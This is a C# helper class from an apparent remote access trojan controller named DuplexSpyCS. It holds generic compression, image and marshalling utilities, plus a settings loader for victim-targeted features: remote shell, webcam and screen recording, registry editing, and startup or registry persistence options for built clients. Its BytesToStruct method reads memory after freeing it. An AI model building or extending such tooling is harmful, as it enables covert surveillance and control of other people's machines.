using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    internal class clsTools
    {
        //GZIP
        public static byte[] Compress(byte[] abBuffer)
        {
            byte[] abData;
            using (MemoryStream ms = new MemoryStream())
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Compress))
                {
                    gzip.Write(abBuffer, 0, abBuffer.Length);
                }

                abData = ms.ToArray();
            }

            return abData;
        }
        public static byte[] Decompress(byte[] abBuffer)
        {
            byte[] abData;

            using (MemoryStream ms = new MemoryStream(abBuffer))
            {
                using (var gzip = new GZipStream(ms, CompressionMode.Decompress))
                {
                    using (MemoryStream msRet = new MemoryStream())
                    {
                        gzip.CopyTo(msRet);
                        abData = msRet.ToArray();
                    }
                }
            }

            return abData;
        }

        /// <summary>
        /// Convert base-64 data string into image.
        /// </summary>
        /// <param name="b64_img"></param>
        /// <returns></returns>
        public static Image Base64ToImage(string b64_img)
        {
            byte[] image_bytes = Convert.FromBase64String(b64_img);
            using (MemoryStream ms = new MemoryStream(image_bytes))
            {
                return new Bitmap(ms);
            }
        }

        /// <summary>
        /// Return opened form with class Victim and enum Function.
        /// </summary>
        /// <param name="v">class Victim</param>
        /// <param name="func">enum Function</param>
        /// <returns></returns>
        public static Form GetFormByVictim(clsVictim v, Function func)
        {
            Form form = null;
            try
            {
                foreach (Form f in Application.OpenForms)
                {
                    FieldInfo field = f.GetType().GetField("v", BindingFlags.Public | BindingFlags.Instance);
                    bool has_victim_field = field != null && field.FieldType == typeof(clsVictim);
                    if (has_victim_field && f.Tag != null)
                    {
                        clsVictim _v = (clsVictim)field.GetValue(f);
                        if ((Function)f.Tag == func && _v == v)
                        {
                            form = f;
                            break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            return form;
        }

        public static string GenerateFileName(string ext = null)
        {
            DateTime date = DateTime.Now;
            return string.Join("", new int[]
            {
                date.Year,
                date.Month,
                date.Day,
                date.Hour,
                date.Minute,
                date.Second,
                date.Millisecond,
            }.Select(x => x.ToString()).ToArray()) + (string.IsNullOrEmpty(ext) ? string.Empty : "." + ext);
        }

        public static string DateTimeStrEnglish()
        {
            return DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        }

        public static bool IsGuid(string guid)
        {
            string pattern = @"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$";
            return Regex.IsMatch(guid, pattern);
        }

        public static byte[] StructToBytes<T>(T structure) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            byte[] buffer = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(structure, ptr, false);
                Marshal.Copy(ptr, buffer, 0, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return buffer;
        }

        public static T BytesToStruct<T>(byte[] buffer) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            if (buffer.Length != size)
            {
                throw new ArgumentException("Byte array size doest not match the size of the structure.");
            }

            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.Copy(buffer, 0, ptr, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return Marshal.PtrToStructure<T>(ptr);
        }

        public static SettingConfig GetConfigFromINI()
        {
            //todo: change all member to read from ini file.
            try
            {
                clsIniManager ini_manager = clsStore.ini_manager;
                string Read(string section, string key)
                {
                    return ini_manager.Read(section, key);
                }

                SettingConfig config = new SettingConfig()
                {
                    #region General

                    dwListenPort = int.Parse(Read("General", "listen_port")),
                    dwTimeout = int.Parse(Read("General", "listen_timeout")),
                    szDbFile = Read("General", "db_file"),

                    #endregion
                    #region Cryptography

                    crypto_szChallengeText = Read("Crypto", "challenge"),
                    crypto_bRandomChallenge = Read("Crypto", "bRandom") == "1",
                    crypto_dwChallengeLength = int.Parse(Read("Crypto", "length")),

                    #endregion
                    #region File Manager

                    fileMgr_dwThread = int.Parse(Read("FileMgr", "thread")),
                    fileMgr_dwMaxFolder = int.Parse(Read("FileMgr", "max_folder")),
                    fileMgr_dwMaxFile = int.Parse(Read("FileMgr", "max_file")),
                    fileMgr_dwTimeout = int.Parse(Read("FileMgr", "timeout")),
                    fileMgr_dwUfChunkSize = int.Parse(Read("FileMgr", "uf_size")),
                    fileMgr_dwDfChunkSize = int.Parse(Read("FileMgr", "df_size")),

                    fileMgr_bMaxFolder = Read("FileMgr", "bMaxFolder") == "1",
                    fileMgr_bMaxFile = Read("FileMgr", "bMaxFile") == "1",

                    #endregion
                    #region Task Manager

                    taskMgr_szAVjson = Read("TaskMgr", "AVjson"),
                    taskMgr_bGetChildProcess = Read("TaskMgr", "childproc") == "1",

                    #endregion
                    #region Service Manager

                    servMgr_szAVjson = Read("ServMgr", "AVjson"),

                    #endregion
                    #region RegEdit

                    reg_dwMaxKey = int.Parse(Read("RegEdit", "max_key")),
                    reg_dwMaxValue = int.Parse(Read("RegEdit", "max_value")),

                    reg_bMaxKey = Read("RegEdit", "bMaxKey") == "1",
                    reg_bMaxValue = Read("RegEdit", "bMaxValue") == "1",

                    #endregion
                    #region Shell

                    shell_szExec = Read("Shell", "exec"),
                    shell_bHistory = Read("Shell", "bHistory") == "1",
                    shell_szHistory = Read("Shell", "file_history"),

                    #endregion
                    #region Monitor

                    monitor_bShowDate = Read("Desktop", "record_showdatetime") == "1",
                    monitor_dwQuality = int.Parse(Read("Desktop", "quality")),

                    #endregion
                    #region Webcam

                    webcam_bShowDate = Read("Webcam", "record_showdatetime") == "1",
                    webcam_dwQuality = int.Parse(Read("Webcam", "quality")),

                    #endregion
                    #region FunStuff

                    msgbox_szCaption = Read("FunStuff", "msgbox_caption"),
                    msgbox_szText = Read("FunStuff", "msgbox_text"),

                    ballon_szTitle = Read("FunStuff", "balloon_caption"),
                    ballon_szText = Read("FunStuff", "balloon_text"),
                    balloon_nTime = int.Parse(Read("FunStuff", "balloon_time")),

                    szLockScreenDir = Read("FunStuff", "dir_lockscreen"),
                    szWallpaperDir = Read("FunStuff", "wallpaper"),

                    #endregion
                    #region Audio

                    szSpeakText = Read("Audio", "speak_text"),

                    #endregion
                    #region Build

                    bCopyDir = Read("Build", "bDirectory") == "1",
                    bStartUp = Read("Build", "bStartUp") == "1",
                    szStartUpName = Read("Build", "szStartUpName"),
                    bRegistry = Read("Build", "bRegistry") == "1",
                    szRegKeyName = Read("Build", "szRegKeyName"),

                    #endregion
                };

                return config;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "GetConfigFromINI()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return new SettingConfig();
            }
        }

        public static bool ExportListView(ListView lv, string szFileName, string szSpliter = ",")
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                string[] aCols = lv.Columns.Cast<ColumnHeader>().Select(x => x.Text).ToArray();
                sb.AppendLine(string.Join(",", aCols));

                sb.AppendLine(new string('-', sb.Length));

                foreach (ListViewItem item in lv.Items)
                {
                    string[] szRow = item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text).ToArray();
                    sb.AppendLine(string.Join(",", szRow));
                }

                File.WriteAllText(szFileName, sb.ToString());

                sb.Clear();
                sb = null;

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }
        }

        public static bool IsPositiveNumber(string szPattern)
        {
            return int.TryParse(szPattern, out int nResult) && nResult > 0;
        }

        public static string BytesNormalize(long bytes_size)
        {
            if (bytes_size < 1024)
                return $"{bytes_size} Bytes";
            else if (bytes_size < 1024 * 1024)
                return $"{bytes_size / 1024.0:F2} KB";
            else if (bytes_size < 1024 * 1024 * 1024)
                return $"{bytes_size / (1024.0 * 1024):F2} MB";
            else if (bytes_size < 1024L * 1024 * 1024 * 1024)
                return $"{bytes_size / (1024.0 * 1024 * 1024):F2} GB";
            else
                return $"{bytes_size / (1024.0 * 1024 * 1024 * 1024):F2} TB";
        }
        public static string ImageToBase64(string file)
        {
            return ImageToBase64(Image.FromFile(file));
        }
        public static string ImageToBase64(Image img)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                img.Save(ms, img.RawFormat);
                return Convert.ToBase64String(ms.ToArray());
            }
        }
        public static bool FileIsImage(string filename)
        {
            string name = Path.GetExtension(filename).Replace(".", string.Empty);
            return clsStore.imgs.Contains(name);
        }
    }
}
